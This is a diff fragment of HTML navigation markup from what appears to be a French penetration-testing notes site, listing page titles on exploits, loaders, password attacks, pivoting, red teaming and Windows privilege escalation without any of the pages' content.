+    <li class="md-nav__item">
+      <a href="../Exploits/Buffer%20Overflow.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Buffer Overflow
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Exploits/Metasploit.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Metasploit
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Exploits/Recherche%20d%27exploit.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Recherche d'exploit
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Games
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Games
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Games/D2.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    D2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Loader
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_10">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Loader
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Loader/Chiffrement.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chiffrement
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Loader/CrystalPalace.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CrystalPalace
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Loader/PandaLoader.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PandaLoader
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Loader/Process%20Injection.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Process Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Loader/ShellCodePack.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ShellCodePack
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Loader/Stager.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Stager
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
+        
+          
+          <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Misc
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_11">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Misc
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Misc/Audit%20de%20code%20source.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Audit de code source
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Misc/AzureHound.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AzureHound
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Misc/Data%20Exfiltration.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Data Exfiltration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Misc/Edition%20Vid%C3%A9o.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Edition Vidéo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Misc/GOAD.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GOAD
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Misc/Notes.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Notes
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Misc/Wi-Fi.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Wi-Fi
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12" >
+        
+          
+          <label class="md-nav__link" for="__nav_12" id="__nav_12_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mobile
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_12_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_12">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Mobile
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Mobile/Rootage%20%26%20CA.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Rootage &amp; CA
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Mobile/Test%20d%27instrusion.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Test d'instrusion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13" >
+        
+          
+          <label class="md-nav__link" for="__nav_13" id="__nav_13_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OSCP
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_13_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_13">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    OSCP
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OSCP/Active%20Directory%20Methodology.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory Methodology
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OSCP/Flags.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Flags
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OSCP/Initial%20Access.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Initial Access
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OSCP/M%C3%A9thodologie.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Méthodologie
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OSCP/Standalone%20Machine%20Methodology.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Standalone Machine Methodology
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_14" >
+        
+          
+          <label class="md-nav__link" for="__nav_14" id="__nav_14_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OSINT
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_14_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_14">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    OSINT
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OSINT/DNS.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OSINT/Emails.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Emails
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_15" >
+        
+          
+          <label class="md-nav__link" for="__nav_15" id="__nav_15_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PasswordAttacks
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_15_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_15">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    PasswordAttacks
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PasswordAttacks/Bruteforce.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bruteforce
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PasswordAttacks/Hashcat%20Rules.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hashcat Rules
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PasswordAttacks/Hashcat.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hashcat
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PasswordAttacks/John.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    John
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PasswordAttacks/NTLM.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NTLM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PasswordAttacks/Offline%20Password%20Cracking.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Offline Password Cracking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PasswordAttacks/Ressources.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ressources
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PasswordAttacks/TMUX.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TMUX
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PasswordAttacks/Wordlists.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Wordlists
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_16" >
+        
+          
+          <label class="md-nav__link" for="__nav_16" id="__nav_16_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pivoting
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_16_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_16">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Pivoting
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Pivoting/DNS%20Tunneling.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS Tunneling
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Pivoting/HTTP%20Tunneling.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HTTP Tunneling
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Pivoting/Ligolo.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ligolo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Pivoting/Pivoting%20checklist.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pivoting checklist
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Pivoting/Port%20Forwarding.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Port Forwarding
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Pivoting/Tunnel%20SSH.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tunnel SSH
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_17" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_17" id="__nav_17_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PrivilegeEscalation
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_17_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_17">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    PrivilegeEscalation
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Linux.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="Windows.html" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#chemins-courants" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Chemins Courants
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#commandes-utiles" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Commandes utiles
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumération
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumération">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#enumeration-manuelle" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumération manuelle
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enumeration-automatique" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumération automatique
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumération automatique">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#privesccheck" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PrivescCheck
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#winpeas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        winPEAS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#seatbelt" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Seatbelt
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows Services
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Windows Services">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#service-binary-hijacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Service Binary Hijacking
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Service Binary Hijacking">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#manuel" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Manuel
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#powerup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PowerUp
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dll-hijacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DLL Hijacking
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="DLL Hijacking">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#manuel_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Manuel
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#powerup_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PowerUp
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#unquoted-service-paths" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Unquoted Service Paths
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Unquoted Service Paths">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#manuel_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Manuel
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#powerup_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PowerUp
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scheduled-tasks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scheduled Tasks
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kernel-exploits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Kernel Exploits
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#seimpersonateprivilege" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SeImpersonatePrivilege
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SeImpersonatePrivilege">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#theorie" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Théorie
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pratique" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pratique
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lolbas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LOLBAS
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#trouver-des-creds" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Trouver des Creds
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#create-admin-account-bypass-uac" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Create Admin Account + Bypass UAC
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windowsold" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows.old
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#alwaysinstallelevated" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        AlwaysInstallElevated
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_18" >
+        
+          
+          <label class="md-nav__link" for="__nav_18" id="__nav_18_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    RedTeam
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_18_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_18">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    RedTeam
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../RedTeam/AdaptixC2.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AdaptixC2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../RedTeam/Antivirus%20Evasion.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Antivirus Evasion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../RedTeam/C2%20Redirector.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C2 Redirector
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../RedTeam/Coerce%20%26%20Relay%20tunneling.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Coerce &amp; Relay tunneling
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../RedTeam/Composants%20de%20s%C3%A9curit%C3%A9%20Windows.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Composants de sécurité Windows
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../RedTeam/MDI.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MDI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../RedTeam/Macro%20Office%20%28VBA%29.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Macro Office (VBA)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
